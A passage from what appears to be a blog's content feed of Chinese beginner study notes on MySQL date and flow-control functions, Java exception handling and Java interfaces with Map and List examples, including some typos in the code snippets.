;</code></pre><p><strong>7.date_format:将日期转化成字符</strong></p><pre class=" language-mysql"><code class="language-mysql">SELECT DATE_ FORMAT (NOW(), '%y年%m月%日') AS out_ put;</code></pre><p><strong>查询有奖金的员工名和入职日期(xx月/xx日xx年)</strong></p><pre class=" language-mysql"><code class="language-mysql">SELECT last_ name, DATE FORMAT (hiredate, '%m月%号d日 %y年') 入职日期FROM employeesWHERE commission_ pct IS NOT NULL:</code></pre><h3 id="4-其他函数"><a href="#4-其他函数" class="headerlink" title="4.其他函数"></a>4.其他函数</h3><p>SELECT VERSION();    //查看版本</p><p>等等</p><h3 id="5-流程控制函数"><a href="#5-流程控制函数" class="headerlink" title="5.流程控制函数"></a>5.流程控制函数</h3><blockquote><p>if函数 if else 效果</p></blockquote><pre class=" language-mysql"><code class="language-mysql">SELECT last_name,commission pct,IE (commission_pct Is NULL,'没奖金呵呵','有奖金,嘻嘻') 备注IFROM employees;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA异常处理</title>
      <link href="/2020/04/06/java-yi-chang-chu-li/"/>
      <url>/2020/04/06/java-yi-chang-chu-li/</url>
      
        <content type="html"><![CDATA[<h1 id="Java异常处理"><a href="#Java异常处理" class="headerlink" title="Java异常处理"></a>Java异常处理</h1><h2 id="1-java异常处理机制"><a href="#1-java异常处理机制" class="headerlink" title="1.java异常处理机制"></a>1.java异常处理机制</h2><p>写代码之后最让我们头疼的是啥？Bug！(程序错误), 写代码完全没有错误的概率是极低的，遇到错误是正常现象。</p><p>我们先来看一段代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExceptionTest</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token function">getStrLength</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//获取字符串长度</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getStrLength</span><span class="token punctuation">(</span>String str<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>之后我们会发现，其打印出<strong>java.lang.NullPonterException</strong>这样的信息，并且<strong>System.out.println(len);</strong>这段代码就没有去执行，这就是java中的程序错误，当发生错误的时候后面的代码就不会继续执行了。</p><p>错误一般分为两种:</p><ul><li>编译错误</li><li>运行错误</li></ul><h3 id="1-1编译错误"><a href="#1-1编译错误" class="headerlink" title="1.1编译错误"></a>1.1编译错误</h3><p>这个是新手经常犯得错误，写上一段时间之后一般就不会出现啦。编译错误啊就是指代码的语法不对，这个就是多写代码可以避免的问题。</p><h3 id="1-2运行错误"><a href="#1-2运行错误" class="headerlink" title="1.2运行错误"></a>1.2运行错误</h3><p>这个相对于编译错误就比较复杂了，这类错误只有在代码运行之后在会出现，只是后运行时出现的错误称为异常。</p><p>因为是在运行的时候出现的错误，所以异常也是可以被我们处理的，这种行为就叫做捕获。如果某个bug出现抛出了异常，需要我们去捕获他，如果不去捕获，程序就会坏掉。</p><h3 id="1-3异常机制"><a href="#1-3异常机制" class="headerlink" title="1.3异常机制"></a>1.3异常机制</h3><p>java中处理异常非常灵活，异常流程和正常流程是分离的，一旦某段程序抛出了异常，这段代码如果有能力进行处理，那么就去捕获它，否则只需要抛出异常由调用者来处理。</p><p>我们看一下代码，它是如何来捕获异常的</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExceptionTest2</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token function">getStrLength</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//可以记录一下异常信息或者执行其他代码逻辑</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"程序执行到这"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 获取字符串的长度</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getStrLength</span><span class="token punctuation">(</span>String str<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>可以看到，在异常被捕获之后，后面的代码就可以继续执行了，让程序更加健全。</p><h2 id="2-Java异常类"><a href="#2-Java异常类" class="headerlink" title="2.Java异常类"></a>2.Java异常类</h2><p>首先来认识一下java异常类的基本情况</p><p><img src="https://style.youkeda.com/img/ham/course/j2/exceptions1.jpg" alt=""></p><p>以上我们可以看出异常类也是java的对象，所以对象该具有的特性也都具备。所有的异常和错误都是继承于Throwable类。它的子类由Error和Exception。</p><h3 id="2-1常见的异常类"><a href="#2-1常见的异常类" class="headerlink" title="2.1常见的异常类"></a>2.1常见的异常类</h3><h4 id="IOException"><a href="#IOException" class="headerlink" title="IOException"></a>IOException</h4><p>操作输入流和输出流时可能出现的异常</p><h4 id="ArithmeticException"><a href="#ArithmeticException" class="headerlink" title="ArithmeticException"></a>ArithmeticException</h4><p>数字异常。如果整数除以0就会出现这种异常。</p><p><code>int a=12/0;//抛出ArithmeticException</code></p><h4 id="NullPointerException"><a href="#NullPointerException" class="headerlink" title="NullPointerException"></a>NullPointerException</h4><p>空指针异常。当引用变量为null时，试图访问对象的属性或方法，就会出现这种异常，例如:</p><pre class=" language-java"><code class="language-java">String d <span class="token operator">=</span> null<span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 抛出NullPointerException</span></code></pre><h4 id="ArrayIndexOutOfBoundsException"><a href="#ArrayIndexOutOfBoundsException" class="headerlink" title="ArrayIndexOutOfBoundsException"></a>ArrayIndexOutOfBoundsException</h4><p>下标越界异常，一般出现在数组中，比如</p><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>array<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 抛出 ArrayIndexOutOfBoundsException</span></code></pre><h4 id="ClassCastException"><a href="#ClassCastException" class="headerlink" title="ClassCastException"></a>ClassCastException</h4><p>当类型转化失败的时候就会出现该异常</p><h4 id="IllegalArgumentException"><a href="#IllegalArgumentException" class="headerlink" title="IllegalArgumentException"></a>IllegalArgumentException</h4><p>非常参数异常，可以用来检查方法的参数是否合法</p><h3 id="2-2异常的作用域"><a href="#2-2异常的作用域" class="headerlink" title="2.2异常的作用域"></a>2.2异常的作用域</h3><p>首先看代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExceptionTest2</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            len <span class="token operator">=</span> <span class="token function">getStrLength</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"程序执行到这"</span><span class="token operator">+</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 获取字符串的长度</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getStrLength</span><span class="token punctuation">(</span>String str<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>以上代码执行之后可以看到抛出了异常。</p><p>try语句要紧跟<strong>{}</strong>的，<strong>{}</strong>代表着代码块，大括号内部的代码都有自己的作用域.</p><h3 id="2-3多个异常捕获"><a href="#2-3多个异常捕获" class="headerlink" title="2.3多个异常捕获"></a>2.3多个异常捕获</h3><p>接下来思考，如果一段程序可能有多个异常又该如何处理呢？</p><p>先看一段代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExceptionTest3</span> <span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExceptionTest3</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"小王"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 字符串转换为数字，这时候就需要使用Integer.parseInt(str)方法</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getInt</span><span class="token punctuation">(</span>String str<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>如上，NumberFormatException在处理字符串和数字的转换中经常会遇到。而且在不注意的情况下，我们也有可能传入null对象，就会导致抛出nullPointException。如果我们想两种异常都捕获的话可以多次catch。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExceptionTest4</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>          num <span class="token operator">=</span> <span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"小文"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NumberFormatException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 字符串转换为数字</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getInt</span><span class="token punctuation">(</span>String str<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>但是由于这些Exceptions都是继承于Exceptio，所以可以直接用一个Exception捕获所有的异常</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExceptionTest4</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>          num <span class="token operator">=</span> <span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"小王"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 字符串转换为数字</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getInt</span><span class="token punctuation">(</span>String str<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>(未完待续……)</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> JAVA面向对象自学笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JAVA接口自学</title>
      <link href="/2020/04/06/java-jie-kou/"/>
      <url>/2020/04/06/java-jie-kou/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA接口"><a href="#JAVA接口" class="headerlink" title="JAVA接口"></a>JAVA接口</h1><h2 id="1-接口语法"><a href="#1-接口语法" class="headerlink" title="1.接口语法"></a>1.接口语法</h2><h3 id="什么是接口"><a href="#什么是接口" class="headerlink" title="什么是接口"></a>什么是接口</h3><p>关于抽象类在以前运用的很多，但是随着Java对接口的升级，抽象类的使用就更多了。</p><blockquote><p>在Java中，<strong>接口</strong>(interface)也是一个类、也包含方法，我们定义一个接口之后，就可以支持多个实现类，接口的调用方也不用关心是谁写的实现类，只关心接口的方法参数、方法返回值就可以无缝的完成程序的对接。</p></blockquote><p>最常见的就是USB接口如图</p><p><img src="http://pic.17qq.com/uploads/acaersuhhx.jpeg" alt=""></p><p>接口的方法都是public并且接口默认不需要方法体</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">LoginService</span><span class="token punctuation">{</span>    String <span class="token function">getLoginPageUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//注意getLoginPageUrl之后没有大括号</span><span class="token punctuation">}</span></code></pre><p>接口举例</p><pre><code>public interface RoleService {   void addRole(Role role);   ArrayList&lt;Role&gt; getRoles();}</code></pre><h2 id="2-接口实现类"><a href="#2-接口实现类" class="headerlink" title="2.接口实现类"></a>2.接口实现类</h2><p>定义好接口之后就好实现接口了</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span>…… <span class="token keyword">import</span>……<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RoleServiceService</span> <span class="token keyword">implements</span> <span class="token class-name">RoleService</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addRole</span><span class="token punctuation">(</span>Role role<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> ArrayList<span class="token operator">&lt;</span>Role<span class="token operator">></span> <span class="token function">getRoles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>我们可以看到接口定义的方法在实现类里必须要全部实现，而且方法签名要一模一样(同样的方法名称、参数、方法返回值)</p><p>接口与抽象是不同的，继承是表达的父子关系，所以子类只能继承一个父类，但是接口是一个约定，实现类可以拥有多个约定，所以实现类可以实现多个接口，用”,”分开。</p><p>我们首先定义一个echo方法</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">EchoService</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 输出任意的内容</span>    <span class="token keyword">void</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>然后看一下它是如何实现的</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> service<span class="token punctuation">.</span>RoleService<span class="token punctuation">;</span><span class="token keyword">import</span> service<span class="token punctuation">.</span>EchoService<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RoleServiceImpl</span>              <span class="token keyword">implements</span> <span class="token class-name">RoleService</span><span class="token punctuation">,</span>EchoService<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addRole</span><span class="token punctuation">(</span>Role role<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> ArrayList<span class="token operator">&lt;</span>Role<span class="token operator">></span> <span class="token function">getRoles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>接口的实例化需要接口实现类</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * RoleServiceTest */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RoleServiceTestTest</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    RoleService roleService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RoleServiceImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//同时实例也可以转换EchoService</span>    <span class="token comment" spellcheck="true">//类型转化：把 roleService 实例转化为 EchoService 接口类型</span>    EchoService echoService <span class="token operator">=</span> <span class="token punctuation">(</span>EchoService<span class="token punctuation">)</span>roleService<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="3-Java常用接口"><a href="#3-Java常用接口" class="headerlink" title="3.Java常用接口"></a>3.Java常用接口</h2><p>首先了解一下Java中最常用的两种接口</p><ul><li>Map</li><li>Llist</li></ul><h4 id="3-1-Map"><a href="#3-1-Map" class="headerlink" title="3.1 Map"></a>3.1 Map</h4><p><img src="https://style.youkeda.com/img/ham/course/j2/java-map1.png" alt=" "></p><p> Map（映射）是遵循key:value这样的形式的集合。key、value的类型可以是任何的Java对象。</p><p>大部分情况下都会使用HashMap这个Map类的实现类，所以想要的到一个Map的实例可以使用HashMap</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// key value 得是 Java 类型</span>Map<span class="token operator">&lt;</span>key<span class="token punctuation">,</span>value<span class="token operator">></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><table><thead><tr><th>key</th><th>value</th></tr></thead><tbody><tr><td>1</td><td>one</td></tr><tr><td>2</td><td>two</td></tr><tr><td>3</td><td>three</td></tr></tbody></table><p>这里可以使用map.put(key,value)这个方式实现数据的存储</p><p>由于Map的键值都是Java对象类型，所以我们在实际创建的时候也需要指定对应的类型，上面的案例中key是数字类型，Integer, value是字符类型:String， 所以我们可以用 Map&lt;Integer, String&gt;来表示，这也是关于泛型的用法</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 实例化Map对象</span>Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span>String<span class="token operator">></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"two"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"three"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>如果想要知道数字3对应的值，就可以使用map.get(key)这个方法来获取</p><pre class=" language-java"><code class="language-java">String weekText <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>weekText<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>由于Map也是一种数据集合，所以也有集合大小的方法：size()和遍历能力for().</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//size()方法</span><span class="token keyword">int</span> size <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//for()方法</span><span class="token keyword">for</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span>String<span class="token operator">></span> entry <span class="token operator">:</span> map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Key = "</span> <span class="token operator">+</span> entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>                   <span class="token string">", Value = "</span> <span class="token operator">+</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><p>多多练习就好啦</p><h4 id="3-2-List"><a href="#3-2-List" class="headerlink" title="3.2 List"></a>3.2 List</h4><p>List是ArrayList的接口，所以两者用法没有特别大的区别，支持同一类型数据的集合存储。</p><p>如字符串集合</p><pre class=" language-java"><code class="language-java">List<span class="token operator">&lt;</span>String<span class="token operator">></span> strings <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>我们学习下简化版的for语句</p><pre class=" language-java"><code class="language-java">ist<span class="token operator">&lt;</span>String<span class="token operator">></span> strings <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>String str <span class="token operator">:</span> strings<span class="token punctuation">)</span><span class="token punctuation">{</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> JAVA面向对象自学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA自学笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端学习概述</title>
      <link href="/2020/04/03/qian-duan-kai-fa-gai-shu/"/>
      <url>/2020/04/03/qian-duan-kai-fa-gai-shu/</url>
      
